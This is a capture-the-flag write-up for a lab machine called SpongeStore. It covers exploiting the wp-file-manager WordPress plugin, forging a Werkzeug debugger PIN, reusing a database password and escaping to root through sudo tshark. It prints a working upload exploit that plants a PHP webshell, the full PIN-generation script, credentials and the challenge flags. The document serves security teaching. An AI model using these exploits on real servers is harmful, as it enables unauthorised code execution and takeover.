# Summary
SpongeStore is a fun medium box that starts off with gaining RCE from a vulnerable wordpress plugin followed by exploiting an internal werkzeug instance to pivot to get the user flag and password re-use for an ssh shell as Angus. Root is a simple tshark sudo gtfobin to complete the box.

# Enumeration

Starting with an initial nmap:

```
sudo nmap -sC -sV -A -T4 192.168.102.145
Starting Nmap 7.80 ( https://nmap.org ) at 2022-01-05 22:57 GMT
Nmap scan report for 192.168.102.145
Host is up (0.00051s latency).
Not shown: 998 closed ports
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
80/tcp open  http    Apache httpd 2.4.41 ((Ubuntu))
|_http-generator: WordPress 5.8.2
|_http-server-header: Apache/2.4.41 (Ubuntu)
|_http-title: SpongeStore &#8211; The spongiest store around!
MAC Address: 00:0C:29:8E:DB:38 (VMware)
No exact OS matches for host (If you know what OS is running on it, see https://nmap.org/submit/ ).
TCP/IP fingerprint:
OS:SCAN(V=7.80%E=4%D=1/5%OT=22%CT=1%CU=37766%PV=Y%DS=1%DC=D%G=Y%M=000C29%TM
OS:=61D6225D%P=x86_64-pc-linux-gnu)SEQ(SP=105%GCD=1%ISR=108%TI=Z%CI=Z%II=I%
OS:TS=A)OPS(O1=M5B4ST11NW7%O2=M5B4ST11NW7%O3=M5B4NNT11NW7%O4=M5B4ST11NW7%O5
OS:=M5B4ST11NW7%O6=M5B4ST11)WIN(W1=FE88%W2=FE88%W3=FE88%W4=FE88%W5=FE88%W6=
OS:FE88)ECN(R=Y%DF=Y%T=40%W=FAF0%O=M5B4NNSNW7%CC=Y%Q=)T1(R=Y%DF=Y%T=40%S=O%
OS:A=S+%F=AS%RD=0%Q=)T2(R=N)T3(R=N)T4(R=Y%DF=Y%T=40%W=0%S=A%A=Z%F=R%O=%RD=0
OS:%Q=)T5(R=Y%DF=Y%T=40%W=0%S=Z%A=S+%F=AR%O=%RD=0%Q=)T6(R=Y%DF=Y%T=40%W=0%S
OS:=A%A=Z%F=R%O=%RD=0%Q=)T7(R=Y%DF=Y%T=40%W=0%S=Z%A=S+%F=AR%O=%RD=0%Q=)U1(R
OS:=Y%DF=N%T=40%IPL=164%UN=0%RIPL=G%RID=G%RIPCK=G%RUCK=G%RUD=G)IE(R=Y%DFI=N
OS:%T=40%CD=S)

Network Distance: 1 hop
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

TRACEROUTE
HOP RTT     ADDRESS
1   0.51 ms 192.168.102.145

OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 19.11 seconds
```

Only SSH (port 22/tcp) and HTTP (80) are open so the web server is most likely going to be the entrypoint.

Browsing to the website redirects to `spongestore.wmg` so that can be added to `/etc/hosts` so everything loads correctly to show:

![picture](https://i.imgur.com/nCG8ulm.png)

The website appears mostly empty aside from the bottom of the page:

![picture](https://i.imgur.com/QruPGIh.png)

Firstly, there are some names which might be useful should usernames be needed to bruteforce any passwords or credentials. There is also a comment stating: `SpongeStore, proudly powered by WordPress`. This means that the website is running wordpress so there might be some vulnerable plugins that could be exploited to gain access to the system. FFUF reinforces this since the only pages returned are wordpress related:

```
ffuf -w /opt/programs/SecLists/Discovery/Web-Content/raft-medium-words.txt -u http://spongestore.wmg/FUZZ.php -fc 403

        /'___\  /'___\           /'___\       
       /\ \__/ /\ \__/  __  __  /\ \__/       
       \ \ ,__\\ \ ,__\/\ \/\ \ \ \ ,__\      
        \ \ \_/ \ \ \_/\ \ \_\ \ \ \ \_/      
         \ \_\   \ \_\  \ \____/  \ \_\       
          \/_/    \/_/   \/___/    \/_/       

       v1.2.1
________________________________________________

 :: Method           : GET
 :: URL              : http://spongestore.wmg/FUZZ.php
 :: Wordlist         : FUZZ: /opt/programs/SecLists/Discovery/Web-Content/raft-medium-words.txt
 :: Follow redirects : false
 :: Calibration      : false
 :: Timeout          : 10
 :: Threads          : 40
 :: Matcher          : Response status: 200,204,301,302,307,401,403,405
 :: Filter           : Response status: 403
________________________________________________

index                   [Status: 301, Size: 0, Words: 1, Lines: 1]
wp-login                [Status: 200, Size: 6690, Words: 322, Lines: 110]
wp-trackback            [Status: 200, Size: 135, Words: 11, Lines: 5]
xmlrpc                  [Status: 405, Size: 42, Words: 6, Lines: 1]
wp-config               [Status: 200, Size: 0, Words: 1, Lines: 1]
wp-links-opml           [Status: 200, Size: 226, Words: 12, Lines: 12]
wp-blog-header          [Status: 200, Size: 0, Words: 1, Lines: 1]
wp-cron                 [Status: 200, Size: 0, Words: 1, Lines: 1]
wp-load                 [Status: 200, Size: 0, Words: 1, Lines: 1]
wp-signup               [Status: 302, Size: 0, Words: 1, Lines: 1]
wp-activate             [Status: 302, Size: 0, Words: 1, Lines: 1]
:: Progress: [63087/63087] :: Job [1/1] :: 4756 req/sec :: Duration: [0:00:05] :: Errors: 0 ::
```

WPScan doesn't find anything useful:

![picture](https://i.imgur.com/UOPtUff.png)

However there could be plugins that it did not find that might be useful. Browsing to ` http://spongestore.wmg/wp-content/plugins` (a common directory for wordpress plugins to be located and hinted by the themes directory) shows:

![picture](https://i.imgur.com/AwaHD8H.png)

Searching for CVEs for wp-file-manager plugin shows:

![picture](https://i.imgur.com/oMV6rN1.png)

Which (according to [CVE.mitre.org](https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2020-25213)) affects all versions before 6.9.  Looking at the readme for the installed plugin:

![picture](https://i.imgur.com/AJcC6Jt.png)

It appears to be version 6.0 so should be exploitable. 

# Foothold

An exploit can be found on [github](https://github.com/w4fz5uck5/wp-file-manager-0day) that shows that the exploit:

```python
#!/usr/bin/env python2

import requests
import sys

print("Usage: %s http://localhost" % sys.argv[0])

burp0_url = "%s/wp-content/plugins/wp-file-manager/lib/php/connector.minimal.php" % sys.argv[1]
burp0_headers = {"User-Agent": "curl/7.68.0", "Accept": "*/*", "Content-Type": "multipart/form-data; boundary=------------------------66e3ca93281c7050", "Expect": "100-continue", "Connection": "close"}
burp0_data = "--------------------------66e3ca93281c7050\r\nContent-Disposition: form-data; name=\"cmd\"\r\n\r\nupload\r\n--------------------------66e3ca93281c7050\r\nContent-Disposition: form-data; name=\"target\"\r\n\r\nl1_Lw\r\n--------------------------66e3ca93281c7050\r\nContent-Disposition: form-data; name=\"upload[]\"; filename=\"x.php\"\r\nContent-Type: image/png\r\n\r\n\x89PNG\r\n\x1a\n\x00\x00\x00\rIHDR\x00\x00\x01^\x00\x00\x01^\x04\x03\x00\x00\x00?\x05j)\x00\x00\x00\x1ePLTE\xff\xff\xff\xef\xef\xef\xe5\xe5\xe5\xce\xce\xce\xa1\xa1\xa1iiiVVVGGG333\x00\x00\x00g\x00\xcc\xe2\x00\x00\r\xc0IDATx\xda\xed]K[\xdb\xc8\x12m\xc9\xce^\xc6\x90\xbb58\t\xdc\x9dm\x9c\t\xd9\xd9X\x1e\xc2\x8e\x87I\xc22\t!\x93\xe5@xmc\x02\xf1\xda\x0f\xa9\xff\xed]`\xeb\xddVU\xc9C\xb5\xe6\xa2-\xd4\xa7\xf2Q\xe9\xa8\x1fuN\x8b\xdf\xb9\xba\xee\x84\xbc\"^\xd7\x83\xc7\x8f\xbc\x9a\x08\xa7\xb1F\xbb\xaa\x97\xf4\xc8:5\xf2^L,A\xbb\x8cSr\xe4\x055\xd2\xbc\x17\x0eC\xbe\xe4H\xf3NL*\x8f\x8f\xd2i\xbe\xf05Y\xf05\xffM\xf5[*\x95J\xb9\xc1\xb7\xdc\xb4\x8f\xde\x9f\x1e\xf5\xec\x86\x95\x83\xfa\xadv\xff\x92\xd3\xcb\xfd\xba]\xd1\x86\x1f\x92Q2\xeck\x19\xb8\xdc\x93FB\xa4>\xf5[\xde\x91\x91k\xd2\xd1\x18\xdf\xeaG\x19\xbb\xdcCK\xd7\xfa-\x97\x12\x90\xb0.\xfcP>\x9629a-\xf9\xd7\xdc\x95\x8a\xcb\xdd\xd6\x11\xdf\x1d\xa9\xbc&5\xfd\xea\xf7\xe5@\x9d\xaf\xbc\xad\xe8\xc6\x0f\x85c9\xef:\xd0\x8c\x8d\x9d\xb9\xe9J\xa7\xa6\x17\xbe\xcb\x83\xf9\xf9\xca[\xad\xea\xd7\xd8MIW\xba-\x9d\xf8\xe1\x85L\xbdn-}\xf87\x1d^)eK\x1f|\x97\x01\xe9\xfa\x15\xcc_\xbf\x10x\xa5[\xd3\x85\x1f\n\x03H\xbe\xf2\\\x17\xfe}\x03JW\x8e+z\xe0k\x1c\xc3\xf2\x95m=\xea\xb7\x08LW\x8e\xf4\xe0\x87-h\xbe\xd3{1\xf3\xaf\t-\x07)\xf7t\xc0\x17\\\x0eR\xf6u\xa8\xdfux\xbe\x0f\x8b\xb7\xbc\xfc\x00\xfa\x16\x87\xbe\xc9\xbc\xfc\x0b\xfcX<\\\x9f\xf8\xf1E\x94\xef\x94\xd1x\xeb\xf7\r&\xdf\xb1\xc5\xce\x0f\x98\xf2\x95\xb2\xc6\xcd\xbf\xc6wT\xbe\xfb\xdc\xf8\x16P\xe9\xca\x9f\xdc\xf5\xbb\x8c\xcbw\xc4\xcd\x0f\x1b\xb8|\xc7\x163\xff\xbe\xc5\xe5\xeb\xd6x\xf15p\xf4 e\x8b\xb7~\x91\xf4 e\x9b\x97\x1f\xcc\x012\xdf\xbfy\xf9\x17IgR\xf6y\xf1]\xc6\xe6;\xe4\xad\xdfg\xd8|G\x16+?\xac`\xf3\x1d\xf3\xf2\xef::_^|\xb7\xb0\xf9:\x16k\xfd\xbe\xc5\xe6\xebV\xb2\xf0Yf|\xf1\xf9\xd6X\xf1\xc5~\x8e\xa5\xcc\x19\xbe2o\xf8\xd6\x84q\xc9\x87/%_\xf3k\x8e\xf8![=<>\xbe\xcc\xfc@\xe13\xce\xef\x1b\xe5{\xc1\x89\xef\x066\xdf\t/\xffR\xc6;\x9c\xf8\xaeP\xc6\xbf\x8c\xf8\xe2\xc7\xeb\xbc\xf3\x8b\"z>\xc4\x8b\xef#\xcf73\xe3\x8b\x9e\xcf\x12\xac\xf8\x1a\xc7\xc8|\x99\xd7w\x04a=\x8a\x13_\xf4z_\x85\x19\xdfW\xf8\xf5T\xce\xf1/e\xbd\x9as\xfc\x8b%\xb43\xc1\x8c/\x92 \xf6\xd8\xf7\xe7\xf1\xfbY\xbc\xfbo\xaf\xb0\xaf\x1b\xf3\xfe&j\x041\x14\xec\xfb\xc7\xe6\r\"\xdf\x03\xc1\xdf\x1f\xb5\x8b,_\xee\xfe(D\x01?tt1\xf7\x97<f?\xccB\xfa\xa3\x8e1\x83\x1d\r\xfaS\xd7\x11sc\x1d\xf0-\xe2\xca\x81\xbd\xbf\x0f\xbc'\xdb\x8eF\xf2\xe0+\xfe\xc0\xf5{\xb2\xf7\xa7\x16`\x9f\x8c\xcfB\x13|\xc5;\xd0\xcePM\xe8Q\xbfB\x14\x07\xf0\xb7M\x0b}\x00\xe0\x8ds\xeb\xde/\xe5\xd7\xb7,\xa7\x03|+4\xc2\xd7H\xad`\xb7\xb6\x88|\x17\xa6\x1fJ\xad\xe0sK\x11\xc9\x82o*\x07\x8f\x03z'-\xf4\xb1)z\xb2mu$\x0f\xbe\xf3_\xb9\x1f\xd6\x9cH\x16|\x85x\x9d\xfe%\xd6\x86\x1f\x84\x10\xc2Tr\xc4\xa4\x1d\xfe\xa5\x9a\xe8\xbb\x0b\xef@\xf2X}\xfc\t\xca\x1f\x93\xd3]\x9c^z\xc1\xfa\xf9$\x84\x9d\x8e\x05\x88d\xc1W\x88\xa5n\x94%~m\xc7#5\xf2\xd70\x9a\xa1\x9apz\x15h$\x0b\xbeB\x88B\xf3\xc3\x0c\xe3\xbb^\x03\x13\xc9\x81\xaf\x10B\x946\xedn\xf7\xa8kw\xd6p\xbf\x94\x07\xdfi\xceB\xfd\xd7\xbc\xf9\x1b\xe5\xcd'o\xfeFF\xde\xf0\xfd\xf2\xe7rVK\xb4k\xe9\xb4B\x8d\xbc\xa4\xde\xb3p/\xdc\xafG\xb4\xeb\xfd\xe0\xe8\xf1#'B\xdeS\xbd\xf4\xe45\xd5\xbf\xcf\xa5\xde\xf3\xda\x11\x0e\xd9K\xef\x94\x1c\xf9m\x8d\x1ay\x97\xb3\xf7\xed>\x83\x1f\xde\xd3\xf7\xed\xe9\xfb\xf6\xf4}\x8b\xfcimssss\xcd\xcaE\xfd\x1ae\xfb\xfd\xf5@J\xf7\xfe\xc8n\xe8?\xfe-\x07\xad\xf4\xeez\xab\xda\xe0\x9b<\xbfhF\x16/~u,\x8d\xf15^\x0f\xe26o\x15m\xeb\xd7\xf83ie(\xb6\x18\xa0\x0b?$\xa7+e\xcf\xd2\x92\r\xe5Rl\xc4\xaaP\x13|\xd5\xd6t\xee\xbe\x86\xf5[\x9c\xb3\x9d\xeb\xd4\xb5\xe3\x07s\xeef\xe3\xa8\xa2\x1b\xff\xbe\x9e\xbf\xb3t\xa8\x19\xbei\x9b\xfbA/H\x1d\xea\xf7\x1d|#W\x07~H\xdf\xda\x0f:\xff\xf1\xf3/\xa0u\xe2V#|!\x9d\x13>\xc0\xfc\xf5\xfbN\xa2:=\xb8\xf9\x01\xd6\xf9\xe3\xf5\"\xb0\xf3/\xb0\xf7\xf2\xb3&\xf8B\x9b\xc9\xc7\x96\x1e\xf5\x0b\xee\x0cl\xe9<?php system($_GET[\"cmd\"]); ?>\r\n--------------------------66e3ca93281c7050--\r\n"
requests.post(burp0_url, headers=burp0_headers, data=burp0_data)

print("URL Shell: %s/wp-content/plugins/wp-file-manager/lib/files/x.php?cmd=<CMD>")
while True:

    cmd = raw_input("$ ")
    burp0_url = "%s/wp-content/plugins/wp-file-manager/lib/files/x.php?cmd=%s" % (sys.argv[1], cmd)
    burp0_headers = {"User-Agent": "curl/7.68.0", "Accept": "*/*", "Expect": "100-continue", "Connection": "close"}
    r = requests.get(burp0_url, headers=burp0_headers)
    print(r.text)
```

Makes a post request to `connector.minimal.php` that uploads a PNG containing a PHP webshell that can then execute commands given to the page `x.php` in GET parameters. Executing the exploit results in:

![picture](https://i.imgur.com/twStVFv.png)

And as seen in the picture, the result of `id` can be seen to show the id of the www-data user meaning that code execution has been succcessful. Turning this into a reverse shell is trivial:

![picture](https://i.imgur.com/bpXklzN.png)

Looking around the box, there are 2 users (Peter and Angus) but neither of their home directories are accessible. There are barely any processes running on the box aside from the web server and some application being ran by Angus:

![picture](https://i.imgur.com/oDwFNiD.png)

Looking at the open ports:

![picture](https://i.imgur.com/clB4L5V.png)

## Port forwarding the internal web server

The web server is on port 80, and there are two ports that could be the application Angus is running - port 5000 and port 3306 which could be a web server and an accompanying database server. Curling the port 5000 responds with:

![picture](https://i.imgur.com/GSFWQm1.png)

Which means that it is indeed a web server. To enumerate this better, the port can be forwarded so that it can be accessed like a normal website. To do this, I'm using [reverse_ssh](https://github.com/NHAS/reverse_ssh) as I can never remember the chisel syntax. After transferring the client binary to the box, it can be ran:

![picture](https://i.imgur.com/So8DBKg.png)

So now the box can be accessed using ssh:

![picture](https://i.imgur.com/JwWrUhV.png)

And port 5000 can be forwarded so it's accessible on my machine also at port 5000:

![picture](https://i.imgur.com/Otp9Ve6.png)

Now when I access `http://127.0.0.1:5000` I receive the page:

![picture](https://i.imgur.com/1KaM4IL.png)

## Enumerating the internal page

The page is pretty empty and the only input field present is a simple search box that only filters the current items on screen. Directory fuzzing shows one endpoint:

```
ffuf -u http://127.0.0.1:5000/FUZZ -w /opt/programs/SecLists/Discovery/Web-Content/raft-medium-words.txt 

        /'___\  /'___\           /'___\       
       /\ \__/ /\ \__/  __  __  /\ \__/       
       \ \ ,__\\ \ ,__\/\ \/\ \ \ \ ,__\      
        \ \ \_/ \ \ \_/\ \ \_\ \ \ \ \_/      
         \ \_\   \ \_\  \ \____/  \ \_\       
          \/_/    \/_/   \/___/    \/_/       

       v1.2.1
________________________________________________

 :: Method           : GET
 :: URL              : http://127.0.0.1:5000/FUZZ
 :: Wordlist         : FUZZ: /opt/programs/SecLists/Discovery/Web-Content/raft-medium-words.txt
 :: Follow redirects : false
 :: Calibration      : false
 :: Timeout          : 10
 :: Threads          : 40
 :: Matcher          : Response status: 200,204,301,302,307,401,403,405
________________________________________________

console                 [Status: 200, Size: 1909, Words: 405, Lines: 52]
:: Progress: [63087/63087] :: Job [1/1] :: 586 req/sec :: Duration: [0:02:17] :: Errors: 0 ::
```

And browsing to this endpoint shows a Werkzeug Debugger:

![picture](https://i.imgur.com/ULXd6Bj.png)

# User

The Werkzeug debugger is hosted on the web app running as Angus. As Angus is running it, if code execution can be obtained through this debugger, we can get a shell as Angus!

## Werkzeug PIN exploit

The debugger is protected by a pin. Werkzeug's method for calculating the pin can be reverse as detailed in [Dahee Park's article](https://www.daehee.com/werkzeug-console-pin-exploit/) and shown on [hacktricks](https://book.hacktricks.xyz/pentesting/pentesting-web/werkzeug). To do this, access is needed to private information but since RCE has already been obtained, these values aren't private anymore. Pulling the default script from the article:

```python
import hashlib
from itertools import chain
probably_public_bits = [
	'web3_user',# username
	'flask.app',# modname
	'Flask',# getattr(app, '__name__', getattr(app.__class__, '__name__'))
	'/usr/local/lib/python3.5/dist-packages/flask/app.py' # getattr(mod, '__file__', None),
]

private_bits = [
	'279275995014060',# str(uuid.getnode()),  /sys/class/net/ens33/address
	'd4e6cb65d59544f3331ea0425dc555a1'# get_machine_id(), /etc/machine-id
]

h = hashlib.md5()
for bit in chain(probably_public_bits, private_bits):
	if not bit:
		continue
	if isinstance(bit, str):
		bit = bit.encode('utf-8')
	h.update(bit)
h.update(b'cookiesalt')
#h.update(b'shittysalt')

cookie_name = '__wzd' + h.hexdigest()[:20]

num = None
if num is None:
	h.update(b'pinsalt')
	num = ('%09d' % int(h.hexdigest(), 16))[:9]

rv =None
if rv is None:
	for group_size in 5, 4, 3:
		if len(num) % group_size == 0:
			rv = '-'.join(num[x:x + group_size].rjust(group_size, '0')
						  for x in range(0, len(num), group_size))
			break
	else:
		rv = num

print(rv)
```

### Obtaining Werkzeug PIN exploit values

The values that will need changing are:

 - username
 - `getattr(mod, '__file__', None)`
 - `str(uuid.getnode()),  /sys/class/net/ens33/address`
 - `get_machine_id(), /etc/machine-id`
  
Since they are machine dependant. The user running the service is Angus. And the other values can be found as detailed in the article.

#### `getattr(mod, '__file__', None)`

The value of `getattr(mod, '__file__', None)` is determined as the location of the flask `app.py` in `dist-packages` this can be found as follows:

![picture](https://i.imgur.com/Dx2fTqU.png)

#### `str(uuid.getnode()),  /sys/class/net/ens33/address`

There are two ways to get this but since Werkzeug debugger uses `str(uuid.getnode())` to calculate this value, it's probably safest to use the result of this command than it would be to convert the mac address of the interface into decimal. So this can be found with:

![picutre](https://i.imgur.com/1NyKlqX.png)

#### `get_machine_id(), /etc/machine-id`

The `get_machine_id()` function exists inside the `__init__.py` file and is rather large and dependant on most of the python dependencies listed in that file so the easiest value to obtain is through `/etc/machine-id` which can be obtained using:

![picture](https://i.imgur.com/IrOvbUR.png)

#### Running the exploit
The final values can be seen as:

```diff
diff defaultPINExploit.py pinExploit.py 
4c4
<       'web3_user',# username
---
>       'angus',# username
7c7
<       '/usr/local/lib/python3.5/dist-packages/flask/app.py' # getattr(mod, '__file__', None),
---
>       '/usr/local/lib/python3.8/dist-packages/flask/app.py' # getattr(mod, '__file__', None),
11,12c11,12
<       '279275995014060',# str(uuid.getnode()),  /sys/class/net/ens33/address
<       'd4e6cb65d59544f3331ea0425dc555a1'# get_machine_id(), /etc/machine-id
---
>       '158120054869863',# str(uuid.getnode()),  /sys/class/net/ens33/address
>       'c34dfd2441154d6797e82cf80cd8b166'# get_machine_id(), /etc/machine-id

```

When the script is ran, a code is outputted: `283-149-359`. However this does not work:

![picture](https://i.imgur.com/eKxgmJ8.png)

### Fixing the issue

After some unsuccessful debugging, and re-reading the hacktricks article, it appears that the value simply obtained from `/etc/machine-id` might be incorrect with the article detailing:

> `get_machine_id()` read the value in `/etc/machine-id` or `/proc/sys/kernel/random/boot_id` and return directly if there is, sometimes it might be required to append a piece of information within `/proc/self/cgroup` that you find at the end of the first line (after the third slash)

The contents of `/proc/self/cgroup` would be the contents for the bash process currently in use. But the Werkzeug debugger would use the information found in it's cgroup file since `self` would refer to the process id of the flask application. The pid can be found with:

```
ps aux
USER         PID %CPU %MEM    VSZ   RSS TTY      STAT START   TIME COMMAND
----------          [SNIP]          ----------
mysql       1001  0.2 10.3 1758208 412040 ?      Ssl  Jan05   0:43 /usr/sbin/mysqld
root        1323  0.0  0.0      0     0 ?        S<   Jan05   0:00 [loop3]
root        1437  0.0  0.0      0     0 ?        S<   Jan05   0:00 [loop4]
root        1576  0.0  0.0      0     0 ?        S<   Jan05   0:00 [loop5]
www-data    2565  0.0  1.1 236560 47936 ?        S    Jan05   0:01 /usr/sbin/apache2 -k start
uuidd       3850  0.0  0.0   7996  1088 ?        Ss   Jan05   0:00 /usr/sbin/uuidd --socket-activation
root       32326  0.0  0.2 249540  9736 ?        Ssl  Jan05   0:00 /usr/lib/upower/upowerd
angus      34668  0.0  0.7  46852 31020 ?        Ss   Jan05   0:00 /usr/bin/python3 app.py
angus      34691  2.0  0.8 1071748 35192 ?       Sl   Jan05   2:07 /usr/bin/python3 /home/angus/stockchecker/app.py
root       35723  0.0  0.0      0     0 ?        I    Jan05   0:03 [kworker/1:1-mpt_poll_0]
www-data   36623  0.0  0.4 230640 19056 ?        S    Jan05   0:00 /usr/sbin/apache2 -k start

----------          [SNIP]          ----------

```

So the process id is `34691` and viewing the cgroup file shows:

![picture](https://i.imgur.com/0HKezb2.png)

So the value after the third brackets is what's needed to be appended onto the end of the machine id. Meaning the final script is:

```python
import hashlib
from itertools import chain
probably_public_bits = [
	'angus',# username
	'flask.app',# modname
	'Flask',# getattr(app, '__name__', getattr(app.__class__, '__name__'))
	'/usr/local/lib/python3.8/dist-packages/flask/app.py' # getattr(mod, '__file__', None),
]

private_bits = [
    
	'158120054869863',# str(uuid.getnode()),  /sys/class/net/ens33/address
	'c34dfd2441154d6797e82cf80cd8b166stockchecker.service'# get_machine_id(), /etc/machine-id
]

h = hashlib.sha1()
for bit in chain(probably_public_bits, private_bits):
	if not bit:
		continue
	if isinstance(bit, str):
		bit = bit.encode('utf-8')
	h.update(bit)
h.update(b'cookiesalt')
#h.update(b'shittysalt')

cookie_name = '__wzd' + h.hexdigest()[:20]

num = None
if num is None:
	h.update(b'pinsalt')
	num = ('%09d' % int(h.hexdigest(), 16))[:9]

rv =None
if rv is None:
	for group_size in 5, 4, 3:
		if len(num) % group_size == 0:
			rv = '-'.join(num[x:x + group_size].rjust(group_size, '0')
						  for x in range(0, len(num), group_size))
			break
	else:
		rv = num

print(rv)
```

### Getting user shell

Which gives a pin of: `266-586-701` which successfully unlocks the debugger!

![picture](https://i.imgur.com/SfvgcA1.png)

So now a reverse shell can be obtained since os can be imported:

![picture](https://i.imgur.com/k7rOG6H.png)

Which successfully executes giving a shell as Angus:

![picture](https://i.imgur.com/7EYEyS2.png)

And the user flag can now be obtained:

![picture](https://i.imgur.com/DrBUjIH.png)

`WMG{goOd_OL_UN4U7H3N7ic473d_rc3_7HrOUgh_WorDPr355_pLUgIn2}`

# Root

The todo note in Angus' home directory states:

> Hey Angus,
> 
> We seem to be getting some TCP fragmentation issues on this machine, not sure why exactly.
> 
> Could you get some packet dumps made and we'll review them at the next team meeting?
> 
> Thanks,
> 
> Peter

Since capturing packets requires `CAP_NET_RAW` this is usually restricted so that only privileged users can perform these action (since sensitive data could be intercepted).

## Getting Angus' password

On this machine, Angus cannot run sudo:

![picture](https://i.imgur.com/oDKe7QR.png)

And guessing some basic passwords doesn't result in anything useful. 

### Looking for a password

Looking at the application Angus was running, there is a database password:

```python
from flask import Flask, render_template, request
from flask_mysqldb import MySQL

app = Flask(__name__)

app.config["MYSQL_HOST"] = "127.0.0.1"
app.config["MYSQL_USER"] = "stockcheck"
app.config["MYSQL_PASSWORD"] = "57r0n6357_club_0n_c4mpu5"
app.config["MYSQL_DB"] = "stockcheck"

mysql = MySQL(app)


@app.route("/", methods=["POST", "GET"])
def login():
    query = "SELECT * FROM stock"
    arguments = []
    if request.method == "POST" and request.form.get("product_name") is not None:
        query = "SELECT * FROM stock WHERE name LIKE %s"
        arguments = ["%" + request.form.get("product_name") + "%"]

    cur = mysql.connection.cursor()
    cur.execute(query, arguments)
    rv = cur.fetchall()

    print(rv)

    return render_template("stock.html", products=rv)


app.run(host="127.0.0.1", port=5000, debug=True)
```

### Password reuse

After looking in the database to find no users or credentials table, I try to reuse the password as the password to Angus' account:

![picture](https://i.imgur.com/Y3njQ07.png)

## Escalating to root

Success! I now have Angus' password so can try looking if Angus has any sudo privileges again:

![picture](https://i.imgur.com/6gwgPX3.png)

So Angus can run tshark with sudo privileges. Looking at [GTFOBins for tshark](https://gtfobins.github.io/gtfobins/tshark/), there is a vulnerability to use tshark to get a system shell which could also be used here to get a shell as root:

![picture](https://i.imgur.com/fpWk6Ov.png)

This should also work for the sudo privileges Angus has

### Exploiting tshark sudo privileges

The exploit is as simple as copy pasting the code from the website into the terminal:

![picture](https://i.imgur.com/uuqvJCp.png)

Success! A shell is spawned as root and the root flag can be retrieved:

`WMG{w417_1_5h0ULDn7_l37_P30pl3_5ud0_r4nD0m_Pr09r4mZ??}`
